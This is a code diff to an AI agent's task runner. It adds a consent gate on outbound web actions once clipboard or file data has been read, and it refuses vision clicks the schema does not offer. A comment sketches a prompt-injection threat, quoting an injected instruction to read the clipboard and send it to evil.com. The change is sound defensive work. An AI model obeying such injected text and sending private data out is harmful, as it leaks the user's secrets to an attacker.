@@ -1,10 +1,13 @@
 import { v4 as uuid } from "uuid";
 import type { ChatMessage } from "../llm.js";
-import { AGENT_ACTION_NAMES } from "./actions.js";
+import { AGENT_ACTION_NAMES, VISION_CLICK_ENABLED } from "./actions.js";
 import { classifyAction } from "./safety.js";
 import { confirmPrompt } from "./confirmPrompts.js";
 import { buildAgentSystemPrompt, type Planner } from "./planner.js";
 import type { ActionResult, AgentAction, AgentDevice, AgentOutcome, AgentStatus, Observation } from "./types.js";
+
+// Actions that send something to (or navigate toward) the outside world.
+const OUTBOUND_ACTIONS = new Set(["web_open", "open_url", "web_fill", "web_press", "web_click"]);
 
 export const AGENT_LIMITS = {
   maxSteps: 40,
@@ -62,7 +65,7 @@ function describe(action: AgentAction): string {
 type Pending =
   | { type: "ask"; toolCallId: string }
   // consentOnly: the user's yes grants *screen use for this task* — it must NOT double as agreement to a risky click.
-  | { type: "confirm"; toolCallId: string; action: AgentAction; consentOnly?: boolean };
+  | { type: "confirm"; toolCallId: string; action: AgentAction; consentOnly?: boolean; grants?: "screen" | "outbound" };
 
 export interface AgentRunnerOptions {
   id?: string;
@@ -91,6 +94,10 @@ export class AgentRunner {
   private pending?: Pending;
   // The user agreed (once, by voice) that this task may look at their screen and use the mouse. Per task, never persisted.
   private screenConsent = false;
+  // Private data (clipboard / a file's contents) has been read into this task. From then on, going OUT to a website needs a
+  // yes — otherwise injected text in a file or page could say "read the clipboard, then open evil.com/?d=<it>".
+  private sawPrivateData = false;
+  private outboundAllowed = false;
 
   constructor(private readonly opts: AgentRunnerOptions) {
     this.id = opts.id ?? uuid();
@@ -131,7 +138,8 @@ export class AgentRunner {
     if (!p || p.type !== "confirm") return this.loop();
     this.pending = undefined;
     if (p.consentOnly && yes) {
-      this.screenConsent = true;
+      if (p.grants === "outbound") this.outboundAllowed = true;
+      else this.screenConsent = true;
       const outcome = await this.execute(this.withConsent(p.action), p.toolCallId); // runs; a risky click still asks separately
       return outcome ?? this.loop();
     }
@@ -228,9 +236,21 @@ export class AgentRunner {
         return { kind: "ask", question: text("question") || "Could you tell me a bit more?" };
       }
 
+      // The planner is only OFFERED screen look while vision clicking is off — but a provider that ignores the schema (or a
+      // prompt-injected model) can still emit it, so refuse here, not just in the schema.
+      if (action.name === "screen_click" && !VISION_CLICK_ENABLED) {
+        this.push({ role: "tool", tool_call_id: toolCallId, content: JSON.stringify({ ok: false, message: "Clicking by sight is switched off. Use observe and the element ids instead." }) });
+        continue;
+      }
+      if (this.sawPrivateData && !this.outboundAllowed && OUTBOUND_ACTIONS.has(action.name)) {
+        const prompt = confirmPrompt("outbound", "", this.opts.language);
+        this.pending = { type: "confirm", toolCallId, action, consentOnly: true, grants: "outbound" };
+        this.opts.onStatus?.({ state: "waiting", text: prompt });
+        return { kind: "confirm", prompt };
+      }
       if (action.name.startsWith("screen_") && !this.screenConsent) {
         const prompt = confirmPrompt("screen", "", this.opts.language);
-        this.pending = { type: "confirm", toolCallId, action, consentOnly: true };
+        this.pending = { type: "confirm", toolCallId, action, consentOnly: true, grants: "screen" };
         this.opts.onStatus?.({ state: "waiting", text: prompt });
         return { kind: "confirm", prompt };
       }
@@ -275,6 +295,7 @@ export class AgentRunner {
       if (!v.ok) result = { ...result, ok: false, message: `The action ran, but the check failed: ${v.detail}` };
     }
 
+    if (result.ok && (action.name === "clipboard_read" || action.name === "file_read")) this.sawPrivateData = true;
     this.consecutiveFailures = result.ok ? 0 : this.consecutiveFailures + 1;
     this.opts.onStatus?.({ state: "step", text: result.message, ok: result.ok });
 
